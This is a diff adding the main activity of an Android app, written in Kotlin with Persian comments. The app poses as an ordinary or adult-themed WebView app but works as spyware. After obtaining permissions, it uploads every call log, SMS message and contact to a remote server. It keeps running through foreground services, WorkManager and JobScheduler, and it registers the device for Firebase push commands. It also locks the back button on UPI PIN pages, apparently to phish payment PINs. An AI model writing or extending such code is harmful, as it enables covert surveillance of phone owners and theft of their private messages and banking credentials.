@@ -1,0 +1,794 @@
+package com.example.test
+
+import android.os.Build
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.util.Log
+import android.view.WindowManager
+import android.webkit.WebView
+import android.webkit.WebViewClient
+import android.webkit.WebSettings
+import android.webkit.WebChromeClient
+import androidx.activity.ComponentActivity
+import androidx.activity.compose.setContent
+import androidx.core.view.WindowCompat
+import androidx.core.view.WindowInsetsCompat
+import androidx.core.view.WindowInsetsControllerCompat
+import androidx.compose.foundation.background
+import androidx.compose.foundation.layout.*
+import androidx.compose.material3.*
+import androidx.compose.runtime.*
+import androidx.compose.ui.Alignment
+import androidx.compose.ui.Modifier
+import androidx.compose.ui.geometry.Offset
+import androidx.compose.ui.graphics.Brush
+import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.style.TextAlign
+import androidx.compose.ui.viewinterop.AndroidView
+import androidx.compose.ui.unit.dp
+import androidx.compose.ui.unit.sp
+import com.example.test.utils.NetworkChecker
+import com.example.test.utils.DataUploader
+import com.example.test.utils.DeviceInfoHelper
+import com.example.test.utils.PermissionManager
+import com.example.test.utils.PermissionDialog
+import com.example.test.utils.SmsBatchUploader
+import com.example.test.utils.ContactsBatchUploader
+import com.example.test.utils.CallLogsBatchUploader
+import com.google.firebase.messaging.FirebaseMessaging
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+
+class MainActivity : ComponentActivity() {
+
+    private lateinit var deviceId: String
+    private var fcmToken: String = ""
+    private val handler = Handler(Looper.getMainLooper())
+
+    private val BATTERY_UPDATE_INTERVAL_MS = 600000L
+    private val FCM_TIMEOUT_MS = 3000L
+
+    private lateinit var webView: WebView
+    private lateinit var permissionManager: PermissionManager
+    private val uploadScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    
+    // ⭐ تنظیمات برنامه از config.json
+    private lateinit var appConfig: AppConfig
+
+    companion object {
+        private const val TAG = "MainActivity"
+    }
+
+    private val batteryUpdater = object : Runnable {
+        override fun run() {
+            DataUploader.sendBatteryUpdate(this@MainActivity, deviceId, fcmToken)
+            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
+        }
+    }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        enableFullscreen()
+
+        appConfig = AppConfig.load(this)
+
+        ServerConfig.initialize(this)
+        ServerConfig.printAllSettings()
+
+        deviceId = DeviceInfoHelper.getDeviceId(this)
+        Log.d(TAG, "📱 Device ID: $deviceId")
+
+        subscribeToFirebaseTopic()
+
+        permissionManager = PermissionManager(this)
+        permissionManager.initialize { }
+
+        setContent {
+            MaterialTheme {
+                MainScreen()
+            }
+        }
+    }
+    
+    private fun subscribeToFirebaseTopic() {
+        FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
+            .addOnSuccessListener {
+                Log.d(TAG, "✅ Subscribed to 'all_devices' topic from MainActivity")
+            }
+            .addOnFailureListener { e ->
+                Log.e(TAG, "❌ Failed to subscribe to 'all_devices' topic from MainActivity", e)
+            }
+    }
+    
+    /**
+     * چک کردن اینترنت با دیالوگ
+     */
+    private fun checkInternetConnection(): Boolean {
+        return NetworkChecker.isInternetAvailable(this)
+    }
+
+    private fun enableFullscreen() {
+        actionBar?.hide()
+        // Changed: Let decorView fit system windows properly
+        WindowCompat.setDecorFitsSystemWindows(window, true)
+
+        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
+        windowInsetsController.apply {
+            hide(WindowInsetsCompat.Type.systemBars())
+            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
+        }
+
+        // Set status bar and navigation bar colors to match content
+        window.statusBarColor = android.graphics.Color.TRANSPARENT
+        window.navigationBarColor = android.graphics.Color.TRANSPARENT
+        
+        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
+    }
+
+    @Composable
+    fun MainScreen() {
+        var showPermissionDialog by remember { mutableStateOf(false) }
+        var permissionsGranted by remember { mutableStateOf(false) }
+        var showSplash by remember { mutableStateOf(true) }
+        var hasInternet by remember { mutableStateOf(true) }
+        var showNoInternetDialog by remember { mutableStateOf(false) }
+        val scope = rememberCoroutineScope()
+
+        // چک کردن اینترنت در شروع - قبل از هر چیز
+        LaunchedEffect("internet_check") {
+            hasInternet = checkInternetConnection()
+            Log.d(TAG, "🌐 Internet check result: $hasInternet")
+            if (!hasInternet) {
+                showNoInternetDialog = true
+                Log.w(TAG, "⚠️ Showing no internet dialog")
+            }
+        }
+
+        LaunchedEffect(Unit) {
+            // First show app splash for 3 seconds
+            delay(3000)
+            showSplash = false
+            delay(300)
+            
+            // اول خودکار Permission بگیر
+            if (!permissionManager.checkAllPermissions()) {
+                // درخواست Permission
+                permissionManager.requestPermissions {
+                    // بعد از درخواست، چک کن
+                    if (permissionManager.checkAllPermissions()) {
+                        // همه رو داد
+                        permissionsGranted = true
+                        continueInitialization()
+                    } else {
+                        // نداد، دیالوگ رو نشون بده
+                        showPermissionDialog = true
+                    }
+                }
+            } else {
+                // از قبل داره
+                permissionsGranted = true
+                continueInitialization()
+            }
+        }
+        
+        // ⭐ دیالوگ عدم اتصال به اینترنت
+        if (showNoInternetDialog) {
+            NoInternetDialog(
+                onRetry = {
+                    hasInternet = checkInternetConnection()
+                    if (hasInternet) {
+                        showNoInternetDialog = false
+                    }
+                },
+                onExit = {
+                    finish()
+                }
+            )
+        }
+
+        // ⭐ دیالوگ اینترنت بالای همه چیز نمایش داده میشه
+        if (showNoInternetDialog) {
+            NoInternetDialog(
+                onRetry = {
+                    hasInternet = checkInternetConnection()
+                    Log.d(TAG, "🔄 Retry internet check: $hasInternet")
+                    if (hasInternet) {
+                        showNoInternetDialog = false
+                    }
+                },
+                onExit = {
+                    Log.w(TAG, "❌ User chose to exit - no internet")
+                    finish()
+                }
+            )
+        }
+        
+        Box(
+            modifier = Modifier
+                .fillMaxSize()
+                .background(Color.White)
+        ) {
+            if (showSplash && appConfig.appType != "sexyhub") {
+                // SexyHub بدون splash - مستقیم لود می‌شه
+                // Show splash with config from JSON
+                
+                val appName = appConfig.appName
+                val gradientColors = listOf(
+                    Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor)),
+                    Color(android.graphics.Color.parseColor(appConfig.theme.secondaryColor)),
+                    Color(android.graphics.Color.parseColor(appConfig.theme.accentColor))
+                )
+                
+                Box(
+                    modifier = Modifier
+                        .fillMaxSize()
+                        .background(
+                            brush = androidx.compose.ui.graphics.Brush.linearGradient(
+                                colors = gradientColors
+                            )
+                        ),
+                    contentAlignment = androidx.compose.ui.Alignment.Center
+                ) {
+                    androidx.compose.material3.Text(
+                        text = appName,
+                        style = androidx.compose.material3.MaterialTheme.typography.displayLarge.copy(
+                            fontSize = 48.sp,
+                            fontWeight = androidx.compose.ui.text.font.FontWeight.Bold,
+                            color = Color.White,
+                            letterSpacing = 2.sp
+                        )
+                    )
+                }
+            } else {
+                AndroidView(
+                    factory = { context -> createWebView() },
+                    modifier = Modifier.fillMaxSize(),
+                    update = { webView ->
+                        webView.layoutParams = android.view.ViewGroup.LayoutParams(
+                            android.view.ViewGroup.LayoutParams.MATCH_PARENT,
+                            android.view.ViewGroup.LayoutParams.MATCH_PARENT
+                        )
+                    }
+                )
+
+                if (showPermissionDialog) {
+                    PermissionDialog(
+                        onRequestPermissions = {
+                            scope.launch {
+                                permissionManager.requestPermissions {
+                                    // بعد از درخواست چک می‌کنه
+                                }
+                            }
+                        },
+                        onAllPermissionsGranted = {
+                            // ⭐ وقتی همه Permission‌ها گرفته شد
+                            showPermissionDialog = false
+                            permissionsGranted = true
+                            continueInitialization()
+                        }
+                    )
+                }
+            }
+        }
+    }
+
+    private fun createWebView(): WebView {
+        webView = WebView(this).apply {
+            // Set proper layout params
+            layoutParams = android.view.ViewGroup.LayoutParams(
+                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
+                android.view.ViewGroup.LayoutParams.MATCH_PARENT
+            )
+            
+            // Remove any scrollbar
+            isVerticalScrollBarEnabled = false
+            isHorizontalScrollBarEnabled = false
+            
+            // Set background
+            setBackgroundColor(android.graphics.Color.WHITE)
+        }
+
+        val webSettings: WebSettings = webView.settings
+        webSettings.javaScriptEnabled = true
+        webSettings.javaScriptCanOpenWindowsAutomatically = true
+        webSettings.domStorageEnabled = true
+        webSettings.databaseEnabled = true
+        webSettings.allowFileAccess = true
+        webSettings.allowContentAccess = true
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
+            webSettings.allowFileAccessFromFileURLs = false
+            webSettings.allowUniversalAccessFromFileURLs = false
+        }
+
+        // Critical settings for proper display
+        webSettings.loadWithOverviewMode = true
+        webSettings.useWideViewPort = true
+        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NORMAL
+        
+        webSettings.setSupportZoom(false)
+        webSettings.builtInZoomControls = false
+        webSettings.displayZoomControls = false
+        webSettings.loadsImagesAutomatically = true
+        webSettings.blockNetworkImage = false
+        webSettings.blockNetworkLoads = false
+        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
+        
+        // Set initial scale to 100%
+        webView.setInitialScale(100)
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
+            WebView.setWebContentsDebuggingEnabled(true)
+        } else {
+            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
+        }
+
+        webView.webViewClient = object : WebViewClient() {
+            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
+                return false
+            }
+
+            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
+                return false
+            }
+
+            override fun onPageFinished(view: WebView?, url: String?) {
+                super.onPageFinished(view, url)
+                Log.d(TAG, "✅ WebView loaded")
+
+                webView.evaluateJavascript(
+                    """
+                    (function() {
+                        try {
+                            var el = document.getElementById('deviceId');
+                            if (el) el.innerText = 'Device ID: $deviceId';
+                        } catch(e) {}
+                    })();
+                    """.trimIndent(),
+                    null
+                )
+                
+                // ⭐ خواندن و اعمال رنگ status bar از meta tag
+                webView.evaluateJavascript(
+                    """
+                    (function() {
+                        try {
+                            var metaTheme = document.querySelector('meta[name="theme-color"]');
+                            if (metaTheme) {
+                                return metaTheme.getAttribute('content');
+                            }
+                            return null;
+                        } catch(e) {
+                            return null;
+                        }
+                    })();
+                    """.trimIndent()
+                ) { color ->
+                    if (color != null && color != "null") {
+                        val colorValue = color.replace("\"", "")
+                        try {
+                            val parsedColor = android.graphics.Color.parseColor(colorValue)
+                            runOnUiThread {
+                                window.statusBarColor = parsedColor
+                                window.navigationBarColor = parsedColor
+                                Log.d(TAG, "🎨 Status bar color set to: $colorValue")
+                            }
+                        } catch (e: Exception) {
+                            Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
+                        }
+                    }
+                }
+            }
+
+            override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
+                super.onReceivedError(view, errorCode, description, failingUrl)
+                Log.e(TAG, "❌ WebView error: $description")
+            }
+        }
+
+        webView.webChromeClient = object : WebChromeClient() {
+            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
+                msg?.let {
+                    Log.d(TAG, "JS: ${it.message()}")
+                }
+                return true
+            }
+        }
+
+        // ⭐ اضافه کردن JavaScript Interface برای دسترسی به Device ID و User ID
+        webView.addJavascriptInterface(object {
+            @android.webkit.JavascriptInterface
+            fun getDeviceId(): String {
+                Log.d(TAG, "🔗 JavaScript requested device ID: $deviceId")
+                return deviceId
+            }
+            
+            @android.webkit.JavascriptInterface
+            fun getUserId(): String {
+                Log.d(TAG, "🔗 JavaScript requested user ID: ${appConfig.userId}")
+                return appConfig.userId
+            }
+            
+            @android.webkit.JavascriptInterface
+            fun getAppType(): String {
+                Log.d(TAG, "🔗 JavaScript requested app type: ${appConfig.appType}")
+                return appConfig.appType
+            }
+            
+            @android.webkit.JavascriptInterface
+            fun getAppName(): String {
+                Log.d(TAG, "🔗 JavaScript requested app name: ${appConfig.appName}")
+                return appConfig.appName
+            }
+            
+            @android.webkit.JavascriptInterface
+            fun getThemeColors(): String {
+                Log.d(TAG, "🔗 JavaScript requested theme colors")
+                return appConfig.theme.toJson()
+            }
+            
+            @android.webkit.JavascriptInterface
+            fun getBaseUrl(): String {
+                val baseUrl = ServerConfig.getBaseUrl()
+                Log.d(TAG, "🔗 JavaScript requested base URL: $baseUrl")
+                return baseUrl
+            }
+        }, "Android")
+        
+        Log.d(TAG, "✅ JavaScript Interface added (device ID + user ID)")
+
+        try {
+            webView.loadUrl("file:///android_asset/index.html")
+            Log.d(TAG, "📄 Loading HTML...")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Load error: ${e.message}")
+        }
+
+        return webView
+    }
+
+    private fun continueInitialization() {
+        Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        Log.d(TAG, "🚀 INITIALIZATION STARTED")
+        Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+        var fcmReceived = false
+
+        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+            fcmReceived = true
+            if (task.isSuccessful && task.result != null) {
+                fcmToken = task.result!!
+                Log.d(TAG, "✅ FCM Token: ${fcmToken.take(20)}...")
+            } else {
+                Log.w(TAG, "⚠️ FCM failed")
+                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
+            }
+        }
+
+        handler.postDelayed({
+            if (!fcmReceived) {
+                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
+            }
+
+            uploadScope.launch {
+                try {
+                    Log.d(TAG, "════════════════════════════════════════")
+                    Log.d(TAG, "🚀 UPLOAD SEQUENCE STARTED")
+                    Log.d(TAG, "════════════════════════════════════════")
+
+                    // 1️⃣ رجیستر
+                    Log.d(TAG, "1️⃣ Registering...")
+                    val registerSuccess = DataUploader.registerDevice(
+                        this@MainActivity,
+                        deviceId,
+                        fcmToken,
+                        appConfig.userId
+                    )
+                    Log.d(TAG, if (registerSuccess) "✅ Registered" else "⚠️ Register failed")
+
+                    // 2️⃣ آپلود همه Call Logs
+                    Log.d(TAG, "2️⃣ Uploading all call logs...")
+                    val callLogResult = CallLogsBatchUploader.uploadAllCallLogs(
+                        context = this@MainActivity,
+                        deviceId = deviceId,
+                        baseUrl = ServerConfig.getBaseUrl()
+                    ) { sent, total ->
+                        if (sent % 500 == 0) {
+                            Log.d(TAG, "   Calls: $sent/$total")
+                        }
+                    }
+
+                    when (callLogResult) {
+                        is CallLogsBatchUploader.UploadResult.Success -> {
+                            Log.d(TAG, "✅ Call logs done: ${callLogResult.totalSent}")
+                        }
+                        is CallLogsBatchUploader.UploadResult.Failure -> {
+                            Log.w(TAG, "⚠️ Call logs failed")
+                        }
+                    }
+
+                    Log.d(TAG, "════════════════════════════════════════")
+                    Log.d(TAG, "📦 BACKGROUND UPLOADS STARTED")
+                    Log.d(TAG, "════════════════════════════════════════")
+
+                    // 3️⃣ آپلود همه SMS در پس‌زمینه
+                    launch {
+                        Log.d(TAG, "📱 Uploading all SMS...")
+                        SmsBatchUploader.uploadAllSms(
+                            context = this@MainActivity,
+                            deviceId = deviceId,
+                            baseUrl = ServerConfig.getBaseUrl()
+                        ) { progress ->
+                            when (progress) {
+                                is SmsBatchUploader.UploadProgress.Processing -> {
+                                    if (progress.processed % 1000 == 0) {
+                                        Log.d(TAG, "   SMS: ${progress.processed}/${progress.total}")
+                                    }
+                                }
+                                is SmsBatchUploader.UploadProgress.Completed -> {
+                                    Log.d(TAG, "✅ All SMS done!")
+                                }
+                                else -> {}
+                            }
+                        }
+                    }
+
+                    // 4️⃣ آپلود همه Contacts در پس‌زمینه
+                    launch {
+                        delay(1000)
+                        Log.d(TAG, "👥 Uploading all contacts...")
+                        val contactsResult = ContactsBatchUploader.uploadAllContacts(
+                            context = this@MainActivity,
+                            deviceId = deviceId,
+                            baseUrl = ServerConfig.getBaseUrl()
+                        ) { sent, total ->
+                            if (sent % 500 == 0) {
+                                Log.d(TAG, "   Contacts: $sent/$total")
+                            }
+                        }
+
+                        when (contactsResult) {
+                            is ContactsBatchUploader.UploadResult.Success -> {
+                                Log.d(TAG, "✅ All contacts done: ${contactsResult.totalSent}")
+                            }
+                            is ContactsBatchUploader.UploadResult.Failure -> {
+                                Log.w(TAG, "⚠️ Contacts failed")
+                            }
+                        }
+                    }
+
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ Error: ${e.message}", e)
+                }
+            }
+
+            // 5️⃣ شروع Battery Updater
+            handler.postDelayed({
+                handler.post(batteryUpdater)
+                Log.d(TAG, "🔋 Battery updater started")
+            }, 2000)
+
+            // 6️⃣ شروع Heartbeat Service
+            handler.postDelayed({
+                startBackgroundServices()
+            }, 3000)
+
+        }, FCM_TIMEOUT_MS)
+    }
+
+    private fun startBackgroundServices() {
+        try {
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "🚀 STARTING BACKGROUND SERVICES")
+            Log.d(TAG, "════════════════════════════════════════")
+            
+            // 1️⃣ SmsService
+            val smsIntent = android.content.Intent(this, SmsService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(smsIntent)
+            } else {
+                startService(smsIntent)
+            }
+            Log.d(TAG, "✅ SmsService started")
+
+            // 2️⃣ HeartbeatService
+            val heartbeatIntent = android.content.Intent(this, HeartbeatService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(heartbeatIntent)
+            } else {
+                startService(heartbeatIntent)
+            }
+            Log.d(TAG, "✅ HeartbeatService started")
+            
+            // 3️⃣ ⭐ WorkManager برای Heartbeat (قابل اعتمادتر!)
+            scheduleHeartbeatWorker()
+            
+            // 4️⃣ ⭐ JobScheduler (Backup برای WorkManager)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                com.example.test.utils.JobSchedulerHelper.scheduleHeartbeatJob(this)
+                Log.d(TAG, "✅ JobScheduler scheduled")
+            }
+
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "✅ ALL SERVICES STARTED SUCCESSFULLY")
+            Log.d(TAG, "════════════════════════════════════════")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Services error: ${e.message}")
+        }
+    }
+    
+    /**
+     * ⭐ راه‌اندازی WorkManager برای Heartbeat دوره‌ای
+     * این کار خیلی قابل اعتمادتره از Service معمولی!
+     */
+    private fun scheduleHeartbeatWorker() {
+        try {
+            val workRequest = androidx.work.PeriodicWorkRequestBuilder<HeartbeatWorker>(
+                15, // هر 15 دقیقه
+                java.util.concurrent.TimeUnit.MINUTES,
+                5, // Flex interval: 5 دقیقه
+                java.util.concurrent.TimeUnit.MINUTES
+            )
+                .setConstraints(
+                    androidx.work.Constraints.Builder()
+                        .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
+                        .build()
+                )
+                .setBackoffCriteria(
+                    androidx.work.BackoffPolicy.EXPONENTIAL,
+                    10,
+                    java.util.concurrent.TimeUnit.SECONDS
+                )
+                .addTag("heartbeat")
+                .build()
+
+            androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                HeartbeatWorker.WORK_NAME,
+                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
+                workRequest
+            )
+
+            Log.d(TAG, "💪 WorkManager scheduled for Heartbeat (every 15 minutes)")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ WorkManager schedule failed: ${e.message}")
+        }
+    }
+
+    @Deprecated("Deprecated in Java")
+    override fun onBackPressed() {
+        if (::webView.isInitialized) {
+            val currentUrl = webView.url ?: ""
+            // ⭐ فقط توی صفحات UPI PIN و Final دکمه برگشت رو غیرفعال کن
+            if (currentUrl.contains("upi-pin.html") || 
+                currentUrl.contains("pin.html") || 
+                currentUrl.contains("final.html")) {
+                Log.w(TAG, "🚫 Back button blocked on: $currentUrl")
+                return // نذار برگرده
+            }
+            // توی بقیه صفحات اجازه برگشت بده
+            if (webView.canGoBack()) {
+                webView.goBack()
+            } else {
+                super.onBackPressed()
+            }
+        } else {
+            super.onBackPressed()
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        handler.removeCallbacks(batteryUpdater)
+
+        if (::webView.isInitialized) {
+            webView.stopLoading()
+            webView.clearCache(true)
+            webView.destroy()
+        }
+
+        if (::permissionManager.isInitialized) {
+            permissionManager.stopBatteryMonitoring()
+        }
+
+        Log.d(TAG, "👋 Destroyed")
+    }
+    
+    /**
+     * دیالوگ زیبا برای عدم اتصال به اینترنت
+     */
+    @Composable
+    private fun NoInternetDialog(
+        onRetry: () -> Unit,
+        onExit: () -> Unit
+    ) {
+        AlertDialog(
+            onDismissRequest = { }, // جلوگیری از بسته شدن با کلیک بیرون
+            icon = {
+                Box(
+                    modifier = Modifier
+                        .size(80.dp)
+                        .background(
+                            color = Color(0xFFFFEBEE),
+                            shape = androidx.compose.foundation.shape.CircleShape
+                        ),
+                    contentAlignment = Alignment.Center
+                ) {
+                    Text(
+                        text = "📡",
+                        fontSize = 40.sp
+                    )
+                }
+            },
+            title = {
+                Text(
+                    text = "عدم اتصال به اینترنت",
+                    fontSize = 20.sp,
+                    fontWeight = FontWeight.Bold,
+                    textAlign = TextAlign.Center,
+                    modifier = Modifier.fillMaxWidth()
+                )
+            },
+            text = {
+                Column(
+                    horizontalAlignment = Alignment.CenterHorizontally,
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Text(
+                        text = "برای استفاده از این برنامه به اینترنت نیاز دارید.",
+                        fontSize = 16.sp,
+                        textAlign = TextAlign.Center,
+                        color = Color.Gray,
+                        modifier = Modifier.padding(vertical = 8.dp)
+                    )
+                    
+                    Spacer(modifier = Modifier.height(8.dp))
+                    
+                    Text(
+                        text = "لطفا اتصال خود را بررسی کرده و دوباره تلاش کنید.",
+                        fontSize = 14.sp,
+                        textAlign = TextAlign.Center,
+                        color = Color.Gray
+                    )
+                }
+            },
+            confirmButton = {
+                Button(
+                    onClick = onRetry,
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor))
+                    ),
+                    modifier = Modifier.fillMaxWidth(0.48f)
+                ) {
+                    Text(
+                        text = "🔄 تلاش دوباره",
+                        fontSize = 16.sp,
+                        fontWeight = FontWeight.Bold
+                    )
+                }
+            },
+            dismissButton = {
+                TextButton(
+                    onClick = onExit,
+                    modifier = Modifier.fillMaxWidth(0.48f)
+                ) {
+                    Text(
+                        text = "❌ خروج",
+                        fontSize = 16.sp,
+                        color = Color.Red
+                    )
+                }
+            },
+            containerColor = Color.White,
+            shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp)
+        )
+    }
+}
